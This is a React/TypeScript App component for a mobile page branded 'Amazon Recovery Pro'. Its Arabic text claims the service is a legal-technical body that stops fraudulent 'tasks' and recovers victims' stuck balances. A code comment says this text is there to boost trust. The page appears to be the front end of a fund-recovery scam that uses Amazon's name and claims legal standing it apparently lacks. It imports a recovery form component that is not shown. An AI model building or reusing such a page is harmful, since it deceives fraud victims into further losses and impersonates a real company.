
import React, { useState } from 'react';
import Header from './components/Header';
import RecoveryForm from './components/RecoveryForm';
import LiveStatus from './components/LiveStatus';
import BottomNav from './components/BottomNav';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Home');

  return (
    <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
      <Header />
      
      <main className="flex-1 px-4 py-2">
        <LiveStatus />
        
        <div className="mt-2">
           <div className="flex items-center gap-2 mb-3 px-1">
              <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
              <h3 className="text-gray-800 font-bold text-lg">مركز إيقاف المهام ومعالجة الشكاوي</h3>
           </div>
           <RecoveryForm />
        </div>

        {/* معلومات إضافية لتعزيز الثقة */}
        <div className="mt-6 px-4 text-center">
          <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً في إيقاف المهام الاحتيالية وتصحيح مسار السجلات المالية ورفع الشكاوي للجهات المختصة لاستعادة رصيدك العالق.
          </p>
        </div>
      </main>

      {/* زر الدعم الفني العائم */}
      <div className="fixed bottom-24 right-6 z-50">
        <button className="bg-[#9B4A4E] text-white p-4 rounded-full shadow-2xl animate-bounce flex items-center justify-center border-4 border-white active:scale-90 transition-transform">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
        </button>
      </div>

      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} />
    </div>
  );
};

export default App;
